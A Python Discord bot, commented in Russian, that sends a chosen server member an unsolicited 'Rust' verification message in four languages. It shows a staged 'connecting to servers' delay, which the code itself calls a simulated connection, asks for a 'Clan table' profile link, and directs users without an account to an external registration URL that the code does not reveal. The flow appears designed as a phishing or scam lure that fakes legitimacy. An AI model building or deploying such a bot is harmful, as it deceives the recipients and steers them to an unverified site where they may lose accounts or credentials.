import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import Button, View, Select
import os
import asyncio
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()

DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
REGISTRATION_URL = os.getenv('REGISTRATION_URL')

# Настройка intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Тексты на разных языках
TEXTS = {
    'en': {
        'choose_language': 'Please select your language',
        'language_name': 'English',
        'language_desc': 'Choose English language',
        'connecting': 'Connecting to servers',
        'please_wait': 'Please wait...',
        'connection_established': 'Connection established',
        'send_profile_link': 'Send link to your Clan table profile',
        'send_button': '✅ Send',
        'no_account': '❌ No account',
        'registration_required': 'Registration is required to access the server.',
        'go_to_registration': '✅ Go to registration'
    },
    'ru': {
        'choose_language': 'Please select your language',
        'language_name': 'Русский',
        'language_desc': 'Выбрать русский язык',
        'connecting': 'Подключение к серверам',
        'please_wait': 'Пожалуйста, подождите...',
        'connection_established': 'Подключение к серверам установлено',
        'send_profile_link': 'Отправьте ссылку на ваш профиль Clan table',
        'send_button': '✅ Отправить',
        'no_account': '❌ Нет аккаунта',
        'registration_required': 'Для доступа к серверу требуется регистрация.',
        'go_to_registration': '✅ Перейти к регистрации'
    },
    'fr': {
        'choose_language': 'Please select your language',
        'language_name': 'Français',
        'language_desc': 'Choisir la langue française',
        'connecting': 'Connexion aux serveurs',
        'please_wait': 'Veuillez patienter...',
        'connection_established': 'Connexion établie',
        'send_profile_link': 'Envoyez un lien vers votre profil Clan table',
        'send_button': '✅ Envoyer',
        'no_account': '❌ Pas de compte',
        'registration_required': "L'inscription est requise pour accéder au serveur.",
        'go_to_registration': "✅ Aller à l'inscription"
    },
    'es': {
        'choose_language': 'Please select your language',
        'language_name': 'Español',
        'language_desc': 'Elige el idioma español',
        'connecting': 'Conectando a servidores',
        'please_wait': 'Por favor espere...',
        'connection_established': 'Conexión establecida',
        'send_profile_link': 'Envíe un enlace a su perfil de Clan table',
        'send_button': '✅ Enviar',
        'no_account': '❌ No hay cuenta',
        'registration_required': 'Se requiere registro para acceder al servidor.',
        'go_to_registration': '✅ Ir a registro'
    }
}

# Хранилище выбранных языков пользователей
user_languages = {}

class LanguageSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label='English', description='Choose English language', emoji='🇬🇧', value='en'),
            discord.SelectOption(label='Русский', description='Выбрать русский язык', emoji='🇷🇺', value='ru'),
            discord.SelectOption(label='Français', description='Choisir la langue française', emoji='🇫🇷', value='fr'),
            discord.SelectOption(label='Español', description='Elige el idioma español', emoji='🇪🇸', value='es')
        ]
        super().__init__(placeholder='Choose language...', options=options)

    async def callback(self, interaction: discord.Interaction):
        lang = self.values[0]
        user_languages[interaction.user.id] = lang
        texts = TEXTS[lang]
        
        # Показываем "Подключение к серверам"
        embed = discord.Embed(
            title=texts['connecting'],
            description=texts['please_wait'],
            color=discord.Color.orange()
        )
        
        image_path = os.path.join('assets', 'image.jpg')
        if os.path.exists(image_path):
            file = discord.File(image_path, filename='image.jpg')
            embed.set_image(url='attachment://image.jpg')
            await interaction.response.edit_message(embed=embed, attachments=[file], view=None)
        else:
            await interaction.response.edit_message(embed=embed, view=None)
        
        # Имитация подключения
        await asyncio.sleep(2)
        
        # Показываем успешное подключение
        view = ProfileView(lang)
        embed = discord.Embed(
            title=texts['connection_established'],
            description=f"ℹ️ {texts['send_profile_link']}",
            color=discord.Color.green()
        )
        
        if os.path.exists(image_path):
            file = discord.File(image_path, filename='image.jpg')
            embed.set_image(url='attachment://image.jpg')
            await interaction.edit_original_response(embed=embed, attachments=[file], view=view)
        else:
            await interaction.edit_original_response(embed=embed, view=view)

class LanguageView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(LanguageSelect())

class ProfileView(discord.ui.View):
    def __init__(self, lang='ru'):
        super().__init__(timeout=None)
        self.lang = lang
        texts = TEXTS[lang]
        
        # Кнопка "Отправить"
        send_button = Button(label=texts['send_button'], style=discord.ButtonStyle.green, custom_id='send_profile')
        send_button.callback = self.send_callback
        self.add_item(send_button)
        
        # Кнопка "Нет аккаунта"
        no_account_button = Button(label=texts['no_account'], style=discord.ButtonStyle.red, custom_id='no_account')
        no_account_button.callback = self.no_account_callback
        self.add_item(no_account_button)
    
    async def send_callback(self, interaction: discord.Interaction):
        texts = TEXTS[self.lang]
        await interaction.response.send_message(
            f"Пожалуйста, отправьте ссылку на ваш профиль Clan table",
            ephemeral=True
        )
    
    async def no_account_callback(self, interaction: discord.Interaction):
        texts = TEXTS[self.lang]
        view = RegistrationView(self.lang)
        
        embed = discord.Embed(
            title='Rust',
            description=f"ℹ️ {texts['registration_required']}",
            color=discord.Color.blue()
        )
        
        image_path = os.path.join('assets', 'image.jpg')
        if os.path.exists(image_path):
            file = discord.File(image_path, filename='image.jpg')
            embed.set_image(url='attachment://image.jpg')
            await interaction.response.edit_message(embed=embed, attachments=[file], view=view)
        else:
            await interaction.response.edit_message(embed=embed, view=view)

class RegistrationView(discord.ui.View):
    def __init__(self, lang='ru'):
        super().__init__(timeout=None)
        self.lang = lang
        texts = TEXTS[lang]
        
        # Кнопка "Перейти к регистрации"
        registration_button = Button(
            label=texts['go_to_registration'],
            style=discord.ButtonStyle.link,
            url=REGISTRATION_URL,
            emoji='🔗'
        )
        self.add_item(registration_button)

@bot.event
async def on_ready():
    print(f'Бот {bot.user} запущен!')
    print(f'ID: {bot.user.id}')
    print('Попытка синхронизации команд...')
    try:
        synced = await bot.tree.sync()
        print(f'✅ Синхронизировано {len(synced)} команд:')
        for cmd in synced:
            print(f'  - /{cmd.name}')
    except Exception as e:
        print(f'❌ Ошибка синхронизации команд: {e}')
        import traceback
        traceback.print_exc()
    print('------')
    print('Бот готов к работе!')
    print(f'Пригласите бота с правами: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=274877991936&scope=bot%20applications.commands')

@bot.tree.command(name='rust', description='Запустить верификацию для пользователя')
@app_commands.describe(member='Выберите пользователя для верификации')
async def rust(interaction: discord.Interaction, member: discord.Member):
    """Slash команда для запуска верификации конкретного пользователя"""
    embed = discord.Embed(
        title='Rust',
        description='Please select your language',
        color=discord.Color.blue()
    )
    
    view = LanguageView()
    
    image_path = os.path.join('assets', 'image.jpg')
    
    try:
        # Отправляем в личку пользователю
        if os.path.exists(image_path):
            file = discord.File(image_path, filename='image.jpg')
            embed.set_image(url='attachment://image.jpg')
            await member.send(embed=embed, file=file, view=view)
        else:
            await member.send(embed=embed, view=view)
        
        # Подтверждение в канале
        await interaction.response.send_message(
            f"✅ Сообщение отправлено {member.mention} в личные сообщения",
            ephemeral=True
        )
    except discord.Forbidden:
        # Если у пользователя закрыты ЛС
        await interaction.response.send_message(
            f"❌ Не могу отправить сообщение {member.mention}. У пользователя закрыты личные сообщения.",
            ephemeral=True
        )
    except Exception as e:
        await interaction.response.send_message(
            f"❌ Ошибка при отправке сообщения: {e}",
            ephemeral=True
        )

@bot.event
async def on_message(message):
    # Игнорируем сообщения от ботов
    if message.author.bot:
        return
    
    # Обрабатываем команды
    await bot.process_commands(message)

if __name__ == '__main__':
    bot.run(DISCORD_TOKEN)
